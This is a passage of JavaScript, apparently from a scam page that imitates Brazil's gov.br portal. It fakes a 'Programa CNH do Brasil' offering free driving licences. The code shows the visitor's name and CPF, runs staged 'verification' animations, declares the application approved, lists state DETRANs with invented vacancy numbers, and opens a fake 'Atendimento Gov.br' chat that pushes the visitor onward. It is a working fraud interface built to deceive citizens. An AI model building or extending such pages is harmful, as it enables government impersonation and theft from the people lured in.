        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'container mx-auto px-4 py-6';

        const content = document.createElement('div');
        content.className = 'max-w-4xl mx-auto';

        // Container com nome e CPF
        const userContainer = document.createElement('div');
        userContainer.className = 'grid grid-cols-2 gap-4 mb-6';

        const nameField = document.createElement('div');
        nameField.className = 'col-span-2';
        nameField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">Nome Completo</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${localStorage.getItem('userName') || ''}">
        `;
        userContainer.appendChild(nameField);

        const cpfField = document.createElement('div');
        cpfField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">CPF</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${localStorage.getItem('userCpf') || ''}">
        `;
        userContainer.appendChild(cpfField);
        content.appendChild(userContainer);

        // Container de loading
        const loadingContainer = document.createElement('div');
        loadingContainer.className = 'mt-8 border-t border-gray-200 pt-8';
        loadingContainer.style.cssText = 'opacity: 0; transition: opacity 0.5s ease-in-out;';

        const loadingSpace = document.createElement('div');
        loadingSpace.className = 'space-y-6';

        // Itens de loading animados
        const loadingItems = [
            { title: 'Validando dados cadastrados...', delay: 0 },
            { title: 'Verificando elegibilidade...', delay: 800 },
            { title: 'Consultando vagas disponíveis...', delay: 1600 },
            { title: 'Processando aprovação...', delay: 2400 }
        ];

        loadingItems.forEach((item, index) => {
            const loadingItem = document.createElement('div');
            loadingItem.className = 'flex items-center gap-3';
            loadingItem.style.cssText = 'opacity: 0; transform: translateX(-20px);';
            
            const spinner = document.createElement('div');
            spinner.className = 'animate-spin';
            spinner.innerHTML = '<svg width="20" height="20" viewBox="0 0 16 16" fill="rgb(19, 81, 180)"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg>';
            
            const title = document.createElement('span');
            title.className = 'text-gray-700 font-medium';
            title.textContent = item.title;
            
            loadingItem.appendChild(spinner);
            loadingItem.appendChild(title);
            loadingSpace.appendChild(loadingItem);

            // Animar aparecimento
            setTimeout(() => {
                loadingItem.style.transition = 'all 0.5s ease-in-out';
                loadingItem.style.opacity = '1';
                loadingItem.style.transform = 'translateX(0)';
            }, item.delay);
        });

        loadingContainer.appendChild(loadingSpace);
        content.appendChild(loadingContainer);

        // Fade in do container
        setTimeout(() => {
            loadingContainer.style.opacity = '1';
        }, 100);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);

        // Após todos os carregamentos, mostrar tela final
        setTimeout(() => {
            this.showFinalScreenWithDetran();
        }, 3500);
    }

    showFinalScreenWithDetran() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        this.container.appendChild(nav);
        
        // Criar container principal com HTML exato
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'container mx-auto px-4 py-6';

        const content = document.createElement('div');
        content.className = 'max-w-4xl mx-auto';

        // Recuperar dados do usuário
        const userName = localStorage.getItem('userName') || '';
        const userCpf = localStorage.getItem('userCpf') || '';

        // Container com nome e CPF
        const userContainer = document.createElement('div');
        userContainer.className = 'grid grid-cols-2 gap-4 mb-6';

        const nameField = document.createElement('div');
        nameField.className = 'col-span-2';
        nameField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">Nome Completo</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${userName}">
        `;
        userContainer.appendChild(nameField);

        const cpfField = document.createElement('div');
        cpfField.innerHTML = `
            <label class="block text-sm font-medium text-gray-700">CPF</label>
            <input type="text" disabled class="mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]" value="${userCpf}">
        `;
        userContainer.appendChild(cpfField);
        content.appendChild(userContainer);

        // Container de aprovação
        const approvalContainer = document.createElement('div');
        approvalContainer.className = 'mt-8 border-t border-gray-200 pt-8';

        const spaceContainer = document.createElement('div');
        spaceContainer.className = 'space-y-6';

        // Card verde de aprovação
        const approvalCard = document.createElement('div');
        approvalCard.className = 'bg-green-50 rounded-lg p-5 mb-6';
        approvalCard.innerHTML = `
            <div class="text-center">
                <h4 class="text-base font-semibold text-green-800 mb-3">Parabéns! Cadastro Aprovado com Sucesso</h4>
                <p class="text-sm text-green-700 leading-relaxed">Prezado(a) <strong>${userName}</strong>, CPF <strong>${userCpf}</strong>, informamos que sua solicitação foi analisada e <strong>APROVADA</strong> pelo Sistema Nacional de Habilitação.</p>
                <p class="text-sm text-green-700 leading-relaxed mt-2">O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma <strong>gratuita</strong>, sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil.</p>
                <p class="text-sm text-green-700 leading-relaxed mt-2">Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência.</p>
            </div>
        `;
        spaceContainer.appendChild(approvalCard);

        // Lista DETRAN
        const detranContainer = document.createElement('div');
        detranContainer.className = 'mt-6';
        
        const detranTitle = document.createElement('h4');
        detranTitle.className = 'font-semibold text-[#1351B4] mb-4 text-center text-lg border-b-2 border-[#1351B4] pb-2';
        detranTitle.style.cssText = 'font-weight: 600; color: rgb(19, 81, 180); margin-bottom: 1rem; text-align: center; font-size: 1.125rem; border-bottom: 2px solid rgb(19, 81, 180); padding-bottom: 0.5rem;';
        detranTitle.textContent = 'Selecione o DETRAN do seu Estado';
        detranContainer.appendChild(detranTitle);

        const detranList = document.createElement('div');
        detranList.className = 'space-y-2';

        // Lista DETRAN com dados exatos
        const detranData = [
            { name: 'Detran Acre', vacancies: 52 },
            { name: 'Detran Alagoas', vacancies: 67 },
            { name: 'Detran Amapá', vacancies: 43 },
            { name: 'Detran Amazonas', vacancies: 50 },
            { name: 'Detran Bahia', vacancies: 100 },
            { name: 'Detran Ceará', vacancies: 92 },
            { name: 'Detran Distrito Federal', vacancies: 45 },
            { name: 'Detran Espírito Santo', vacancies: 66 },
            { name: 'Detran Goiás', vacancies: 53 },
            { name: 'Detran Maranhão', vacancies: 64 },
            { name: 'Detran Mato Grosso', vacancies: 72 },
            { name: 'Detran Mato Grosso do Sul', vacancies: 99 },
            { name: 'Detran Minas Gerais', vacancies: 97 },
            { name: 'Detran Pará', vacancies: 57 },
            { name: 'Detran Paraíba', vacancies: 67 },
            { name: 'Detran Paraná', vacancies: 56 },
            { name: 'Detran Pernambuco', vacancies: 97 },
            { name: 'Detran Piauí', vacancies: 50 },
            { name: 'Detran Rio de Janeiro', vacancies: 94 },
            { name: 'Detran Rio Grande do Norte', vacancies: 93 },
            { name: 'Detran Rio Grande do Sul', vacancies: 96 },
            { name: 'Detran Rondônia', vacancies: 79 },
            { name: 'Detran Roraima', vacancies: 43 },
            { name: 'Detran Santa Catarina', vacancies: 98 },
            { name: 'Detran São Paulo', vacancies: 68 },
            { name: 'Detran Sergipe', vacancies: 56 },
            { name: 'Detran Tocantins', vacancies: 44 }
        ];

        detranData.forEach(detran => {
            const detranItem = document.createElement('div');
            detranItem.className = 'flex items-center justify-between p-3 bg-white rounded-sm border border-gray-300 shadow-sm hover:shadow-md hover:border-[#1351B4] transition-all';
            detranItem.style.cssText = 'display: flex; align-items: center; justify-content: space-between; padding: 0.75rem; background-color: white; border-radius: 0.325rem; border: 1px solid rgb(209, 213, 219); box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); transition: all 0.15s ease-in-out;';
            detranItem.addEventListener('mouseenter', () => {
                detranItem.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                detranItem.style.borderColor = 'rgb(19, 81, 180)';
            });
            detranItem.addEventListener('mouseleave', () => {
                detranItem.style.boxShadow = '0 1px 2px 0 rgba(0, 0, 0, 0.05)';
                detranItem.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const detranInfo = document.createElement('div');
            detranInfo.className = 'flex flex-col gap-1';
            detranInfo.style.cssText = 'display: flex; flex-direction: column; gap: 0.25rem;';
            
            const detranName = document.createElement('span');
            detranName.className = 'font-medium text-gray-800';
            detranName.style.cssText = 'font-weight: 500; font-size: 12px; color: rgb(31, 41, 55);';
            detranName.textContent = detran.name;
            
            const detranVacancies = document.createElement('span');
            detranVacancies.className = 'text-sm text-[#1351B4] font-semibold bg-[#1351B4]/10 px-2 py-0.5 rounded-sm w-fit';
            detranVacancies.style.cssText = 'font-size: 0.875rem; color: rgb(19, 81, 180); font-weight: 600; background-color: rgba(19, 81, 180, 0.1); padding: 0.125rem 0.5rem; border-radius: 0.325rem; width: fit-content;';
            detranVacancies.textContent = `${detran.vacancies} vagas`;
            
            detranInfo.appendChild(detranName);
            detranInfo.appendChild(detranVacancies);
            
            const startBtn = document.createElement('button');
            startBtn.className = 'bg-[#1351B4] hover:bg-[#0D3A8C] text-white px-5 py-2 rounded-sm text-sm font-medium transition-all shadow-sm hover:shadow-md whitespace-nowrap';
            startBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.25rem; border-radius: 0.325rem; font-size: 0.875rem; font-weight: 500; transition: all 0.15s ease-in-out; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); white-space: nowrap; border: none; cursor: pointer;';
            startBtn.addEventListener('mouseenter', () => {
                startBtn.style.backgroundColor = 'rgb(13, 58, 140)';
                startBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
            });
            startBtn.addEventListener('mouseleave', () => {
                startBtn.style.backgroundColor = 'rgb(19, 81, 180)';
                startBtn.style.boxShadow = '0 1px 2px 0 rgba(0, 0, 0, 0.05)';
            });
            startBtn.textContent = 'Iniciar Processo';
            startBtn.addEventListener('click', () => {
                this.showChatScreen(detran.name, detran.vacancies);
            });
            
            detranItem.appendChild(detranInfo);
            detranItem.appendChild(startBtn);
            detranList.appendChild(detranItem);
        });

        detranContainer.appendChild(detranList);
        spaceContainer.appendChild(detranContainer);
        approvalContainer.appendChild(spaceContainer);
        content.appendChild(approvalContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showChatScreen(detranName, vacancies) {
        // Definir estado atual como chat
        this.currentScreen = 'chat';
        this.userData.detran = detranName;
        this.userData.vacancies = vacancies;
        this.saveUserState();
        console.log('showChatScreen iniciado com detran:', detranName);
        
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal (mantendo o mesmo)
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Nova navegação de atendimento
        const chatNav = document.createElement('nav');
        chatNav.style.cssText = 'background-color: rgb(245, 245, 245); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        const navLeft = document.createElement('div');
        navLeft.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const profileContainer = document.createElement('div');
        profileContainer.style.cssText = 'position: relative; margin-right: 10px;';
        
        const profileImg = document.createElement('img');
        profileImg.src = 'img/perfilchat.png';
        profileImg.alt = 'Atendimento';
        profileImg.style.cssText = 'width: 28px; height: 28px; border-radius: 50%; object-fit: cover;';
        profileContainer.appendChild(profileImg);
        
        const onlineIndicator = document.createElement('span');
        onlineIndicator.style.cssText = 'position: absolute; bottom: 0px; right: 0px; width: 8px; height: 8px; background-color: rgb(34, 197, 94); border-radius: 50%; border: 2px solid white;';
        profileContainer.appendChild(onlineIndicator);
        
        navLeft.appendChild(profileContainer);
        
        const navText = document.createElement('span');
        navText.style.cssText = 'color: rgb(102, 102, 102); font-size: 0.875rem; font-weight: 300; line-height: 18px; background: none; box-shadow: none;';
        navText.textContent = 'Atendimento Gov.br';
        navLeft.appendChild(navText);
        
        chatNav.appendChild(navLeft);
        this.container.appendChild(chatNav);
        
        // Main do chat
        const chatMain = document.createElement('main');
        chatMain.className = 'flex-1 overflow-hidden bg-gray-50';
        chatMain.style.cssText = 'flex: 1; overflow: hidden; background-color: rgb(249, 250, 251);';
        
        const chatContainer = document.createElement('div');
        chatContainer.className = 'max-w-4xl mx-auto h-full px-4';
        chatContainer.style.cssText = 'max-width: 56rem; margin: 0 auto; height: 100%; padding: 0 1rem;';
        
        const chatMessages = document.createElement('div');
        chatMessages.className = 'h-[calc(100vh-160px)] overflow-y-auto py-4';
        chatMessages.style.cssText = 'height: calc(100vh - 160px); overflow-y: auto; padding: 1rem 0; scroll-behavior: smooth;';
        chatMessages.id = 'chat-messages';
        
        // Mensagem inicial do sistema
        const messageContainer = document.createElement('div');
        messageContainer.className = 'mb-4 text-left';
        messageContainer.style.cssText = 'margin-bottom: 1rem; text-align: left;';
        
        const messageBubble = document.createElement('div');
        messageBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
        messageBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
        messageBubble.textContent = `Para dar continuidade ao seu cadastro no Programa CNH do Brasil através do ${detranName}, informamos que é necessário selecionar a categoria de CNH pretendida.`;
        
        messageContainer.appendChild(messageBubble);
        chatMessages.appendChild(messageContainer);
        
        // Container para opções
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'flex flex-col gap-3 max-w-[80%] mt-2';
        optionsContainer.style.cssText = 'display: flex; flex-direction: column; gap: 0.75rem; max-width: 80%; margin-top: 0.5rem;';
        optionsContainer.id = 'chat-options';
        
        // Botões de categoria
        const categories = [
            { id: 'A', name: 'Categoria A - Motocicletas', icon: 'A' },
            { id: 'B', name: 'Categoria B - Carros', icon: 'B' },
            { id: 'AB', name: 'Categoria AB - Motocicletas e Carros', icon: 'AB' }
        ];
        
        categories.forEach(category => {
            const categoryBtn = document.createElement('button');
            categoryBtn.className = 'flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left';
            categoryBtn.style.cssText = 'display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: linear-gradient(to bottom, rgb(243, 244, 246), white); border: 1px solid rgb(209, 213, 219); border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; text-align: left; cursor: pointer;';
            
            categoryBtn.addEventListener('mouseenter', () => {
                categoryBtn.style.boxShadow = '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)';
                categoryBtn.style.borderColor = 'rgb(19, 81, 180)';
            });
            
            categoryBtn.addEventListener('mouseleave', () => {
                categoryBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                categoryBtn.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const iconSpan = document.createElement('span');
            iconSpan.className = 'text-[#1351B4] text-xl font-bold';
            iconSpan.style.cssText = 'color: rgb(19, 81, 180); font-size: 1.25rem; font-weight: 700;';
            iconSpan.textContent = category.icon;
            
            const textSpan = document.createElement('span');
            textSpan.className = 'font-medium text-gray-800';
            textSpan.style.cssText = 'font-weight: 500; color: rgb(31, 41, 55);';
            textSpan.textContent = category.name;
            
            categoryBtn.appendChild(iconSpan);
            categoryBtn.appendChild(textSpan);
            
            categoryBtn.addEventListener('click', () => {
                this.handleCategorySelection(category.id, category.name, detranName, vacancies);
            });
            
            optionsContainer.appendChild(categoryBtn);
        });
        
        chatMessages.appendChild(optionsContainer);
        chatContainer.appendChild(chatMessages);
        chatMain.appendChild(chatContainer);
        this.container.appendChild(chatMain);
        
        // Salvar estado do chat
        this.currentChatState = {
            detranName,
            vacancies,
            step: 'category_selection'
        };
        this.saveUserState();
    }

    handleCategorySelection(categoryId, categoryName, detranName, vacancies) {
        // Salvar categoria selecionada no userData
        this.userData.category = categoryId;
        this.userData.categoryName = categoryName;
        this.saveUserState();
        console.log('Categoria selecionada:', categoryId, categoryName);
        
        const optionsContainer = document.getElementById('chat-options');
        const messagesContainer = document.getElementById('chat-messages');
        
        // Adicionar efeito de loading nos botões
        const buttons = optionsContainer.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
        });
        
        // Mostrar loading com nome do estado
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = `<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Conectando com ${detranName}...</div>`;
        
        messagesContainer.appendChild(loadingDiv);
        
        // Simular processamento
        setTimeout(() => {
            // Transformar loading em card da mensagem do sistema
            loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            loadingDiv.innerHTML = `Prezado(a) Albertino, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.<br><br>Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.`;
            
            // Remover botões de categoria
            optionsContainer.remove();
            
            // Adicionar mensagem do usuário (apenas "Categoria B")
            const userMessage = document.createElement('div');
            userMessage.className = 'mb-4 text-right';
            userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
            
            const userBubble = document.createElement('div');
            userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
            userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
            userBubble.textContent = categoryName;
            
            userMessage.appendChild(userBubble);
            
            // Inserir a mensagem do usuário antes do loading transformado
            const allMessages = messagesContainer.children;
            const loadingIndex = Array.from(allMessages).indexOf(loadingDiv);
            messagesContainer.insertBefore(userMessage, loadingDiv);
            
            // Adicionar botão PROSSEGUIR
            const proceedBtnContainer = document.createElement('div');
            proceedBtnContainer.className = 'flex justify-center mt-4';
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: center; margin-top: 1rem;';
            
            const proceedBtn = document.createElement('button');
            proceedBtn.className = 'bg-[#1351B4] text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#0D3A8C] transition-colors';
            proceedBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.5rem; border-radius: 0.5rem; font-weight: 600; font-family: Rawline, system-ui, sans-serif; cursor: pointer; transition: all 0.3s; border: none; font-size: 14px;';
            proceedBtn.textContent = 'PROSSEGUIR >>';
            
            proceedBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.showSecondMessage(detranName, categoryId);
            });
            
            proceedBtnContainer.appendChild(proceedBtn);
            messagesContainer.appendChild(proceedBtnContainer);
            messagesContainer.id = 'chat-options';
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 1500);
    }

    showSecondMessage(detranName, categoryId) {
        console.log('showSecondMessage iniciado');
        const optionsContainer = document.getElementById('chat-options');
        
        // Buscar messagesContainer de forma mais robusta
        let messagesContainer = document.getElementById('chat-messages');
        
        if (!messagesContainer) {
            console.log('Tentando buscar por querySelector #chat-messages');
            messagesContainer = document.querySelector('#chat-messages');
        }
        
        if (!messagesContainer) {
            console.log('Tentando buscar por querySelector [id*="chat-messages"]');
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        
        if (!messagesContainer) {
            console.log('Tentando buscar por querySelector .overflow-y-auto');
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        if (!messagesContainer) {
            console.log('Tentando buscar por querySelector main div');
            messagesContainer = document.querySelector('main div');
        }
        
        console.log('messagesContainer encontrado:', messagesContainer);
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado - abortando');
            console.error('Elementos disponíveis:', document.body.innerHTML.substring(0, 500));
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
